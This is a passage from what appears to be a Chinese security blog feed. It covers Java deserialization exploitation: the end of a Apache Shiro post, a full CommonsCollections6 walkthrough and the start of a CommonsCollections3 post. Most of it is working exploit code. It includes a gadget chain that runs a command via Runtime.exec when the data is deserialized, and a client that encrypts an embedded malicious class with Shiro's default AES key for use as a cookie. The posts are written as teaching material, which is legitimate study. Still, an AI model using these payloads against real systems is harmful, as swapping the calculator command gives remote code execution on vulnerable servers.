PriorityQueue&lt;Object&gt;(2, comparator);  </span><br><span class="line">  </span><br><span class="line">            priorityQueue.add(&quot;1&quot;);  </span><br><span class="line">            priorityQueue.add(&quot;1&quot;);  </span><br><span class="line">            //将没改的值 改成恶意值  </span><br><span class="line">            setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); //改成outputProperties,使自动调用getOutputProperties  </span><br><span class="line">            setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;templates, templates&#125;); //让其去对比，且满足 queue[right]) &gt; 0  </span><br><span class="line">  </span><br><span class="line">            // ==================            // 生成序列化字符串  </span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);  </span><br><span class="line">            oos.writeObject(priorityQueue);  </span><br><span class="line">            oos.close();  </span><br><span class="line">  </span><br><span class="line">            return barr.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj, value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Client.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] payloads = new CommonsCollectionsShiro().getPayload(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg&quot;.getBytes());  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的POC传入cookie，弹出计算器</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/gg.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>JAVA安全任重道远，希望对你有所帮助！</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections6</title>
      <link href="/2023/05/17/JAVA-CommonsCollections6/"/>
      <url>/2023/05/17/JAVA-CommonsCollections6/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么需要CC6"><a href="#为什么需要CC6" class="headerlink" title="为什么需要CC6"></a>为什么需要CC6</h1><p>因为这是 Shiro 会利用到的一条链子 可以说是 CC1 + lazymap 的一种重合，但是在 8U71之后，CC1不能用了，主要是sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了。</p><p>CC6 可以说是在CC库中 相对比较通用的利用链，这就是为什么 我CSDN 中也写了，并决定发在这的原因，在后续的Shiro 中 使用频率还是很高的，所以我决定再次深入了解其原理。为了解决高版本中 JAVA的利用问题，我们先来看看此链，继续贴上我的珍藏图：</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/cc%E9%93%BE.jpg"></p><p>可以看到 CC6 是利用的 HashMap的链子，这里贴一下P神 简化的利用链代码;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Gadget chain: </span><br><span class="line">java.io.ObjectInputStream.readObject() </span><br><span class="line">java.util.HashMap.readObject() </span><br><span class="line">java.util.HashMap.hash() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.map.LazyMap.get() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() */</span><br></pre></td></tr></table></figure><p>这个链 主要是要看从最开始到 org.apache.commons.collections.map.LazyMap.get() 的那⼀部 分<br>简单来说，解决Java⾼版本利⽤问 题，实际上就是在找上下⽂中是否还有其他调⽤ LazyMap#get() 的地⽅。</p><p>找到的类是 是 org.apache.commons.collections.keyvalue.TiedMapEntry ，在其getValue⽅法 中调⽤了 this.map.get ，⽽其hashCode⽅法调⽤了getValue⽅法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123;  </span><br><span class="line">  </span><br><span class="line">private static final long serialVersionUID = -8453869361373831205L;  </span><br><span class="line"></span><br><span class="line">    public TiedMapEntry(Map map, Object key) &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        this.map = map;  </span><br><span class="line">        this.key = key;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   public Object getKey() &#123;  </span><br><span class="line">        return key;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public Object getValue() &#123;  </span><br><span class="line">        return map.get(key);  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">// ....</span><br><span class="line"></span><br><span class="line">public int hashCode() &#123; </span><br><span class="line">Object value = this.getValue(); </span><br><span class="line">return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125;</span><br></pre></td></tr></table></figure><p>如果这里的 map &#x3D; LazyMap 就会调用LazyMap#get 触发CC1利用链，欲触发LazyMap利⽤链，要找到就是哪⾥调⽤了 TiedMapEntry#hashCode 。</p><p>，在 java.util.HashMap#readObject 中就可以找到 HashMap#hash() 的调⽤，去掉了 最前⾯的两次调⽤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class HashMap extends AbstractMap implements Map, Cloneable, Serializable &#123;</span><br><span class="line">static final int hash(Object key) &#123; </span><br><span class="line">int h;</span><br><span class="line">return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream s) throws IOException,ClassNotFoundException &#123;</span><br><span class="line"> s.defaultReadObject(); // ... p for (int i = 0; i &lt; mappings; i++) &#123; </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), </span><br><span class="line"> key, value, false, false); &#125; &#125; &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在HashMap的readObject⽅法中，调⽤到了 hash(key) ，⽽hash⽅法中，调⽤到了 key.hashCode() 。所以，我们只需要让这个key等于TiedMapEntry对象，即可连接上前⾯的分析过 程，构成⼀个完整的Gadget。</p><h1 id="逐步构造POC"><a href="#逐步构造POC" class="headerlink" title="逐步构造POC"></a>逐步构造POC</h1><p>然后尝试 自己构造一波这个 POC，再说说自己的踩坑过程，建议都自己构造一次，再来找问题，虽然 会有点长，但是你一步步自己构造一定会收获颇丰！ 以下是我个人的POC  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功弹出计算器~</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/exec1.PNG"></p><p>但实际上 我们这个计算器弹的是不正确的，为了避免本地调试时触发命令执 ⾏我们可以加入 假 的Transformer数组进去，等最后要⽣成Payload的 时候，再生成一个 ChainedTransformer，调用其方法，再把真正的 transformers 替换进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,transformers);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，这下G了  连计算器都不弹了……..</p><h1 id="为什么没有弹出计算器？"><a href="#为什么没有弹出计算器？" class="headerlink" title="为什么没有弹出计算器？"></a>为什么没有弹出计算器？</h1><p>单步调试⼀下 ，会发现关键点在LazyMap的get⽅法 ，他没有进入这个if语句，得到的结果就是没有触发我们的命令 </p><p><img src="/2023/05/17/JAVA-CommonsCollections6/ec.jpG"></p><p>这是为什么呢?<br><code>_containsKey_方法——判断是否包含指定的键名</code>  </p><p>唯一出现 Ku1s - 1 的地方 就是在我们 new TiedMapEntry 的时候<br>但 TiedMapEntry 的构造函数并没有修改outerMap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//LazyMap构造部分  </span><br><span class="line">HashMap innerMap = new HashMap();  </span><br><span class="line">Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">//TiedMapEntry构造部分  </span><br><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);</span><br><span class="line"></span><br><span class="line">HashMap hashMap = new HashMap();  </span><br><span class="line">hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);</span><br></pre></td></tr></table></figure><p>其实关键点就在于 hashMap.put(tiedMapEntry,”Ku1s-2”); 语句</p><p>HashMap的put⽅法中，也有调⽤到 hash(key) ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123; </span><br><span class="line">return putVal(hash(key), key, value, false, true); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哈哈哈  这就相当于撞了个乌龙！~ 本来是想利用 readObject 中的 hash()去调用的，没曾想put方法也能够触发这个 hash ，也就是说提前把我们的代码执行了一遍，因为我前⾯⽤了 fakeTransformers ，所以此 时并没有触发命令执⾏，但实际上也对我们构造Payload产⽣了影响。</p><p>我们的解决⽅法也很简单，只需要将Ku1s-1这个Key，再从outerMap中移除即 可： outerMap.remove(“Ku1s-1”) 。</p><p>完整POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] exp = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        outMap.remove(&quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,exp);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/17/JAVA-CommonsCollections6/poc.png"></p><p>希望对你有所帮助 ~</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections3</title>
      <link href="/2023/05/16/JAVA-CommonsCollections3/"/>
      <url>/2023/05/16/JAVA-CommonsCollections3/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么需要CommonsCollections3"><a href="#为什么需要CommonsCollections3" class="headerlink" title="为什么需要CommonsCollections3"></a>为什么需要CommonsCollections3</h1><p>上篇文章 分析了 动态加载字节码的危害，如果有一个可控的http服务路径，则可能存在 恶意加载动态字节码，因此，我们很自然的会想到，如何更巧妙的利用他，所以 CC3 诞生了。</p><p>CC3 其实是 和 CC1 的结合  即 从原来的 InvokerTransformer 到 Runtime.class 到exec() 变成了 InvokerTransformer调用 TemplatesImpl#newTransformer()~</p><p>届时，我献出我珍藏已久的一张图：<br><img src="/2023/05/16/JAVA-CommonsCollections3/cc%E9%93%BE.jpg"></p><p>我们只需要将 CC1 和 CC3 两段POC 结合一下，即可很容易的改造出一个任意字节码的CC链，只需要把CC1中的 InvokerTransformer 的执行方法 改成 TemplatesImpl::newTransformer() 即可：</p><p>POC如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 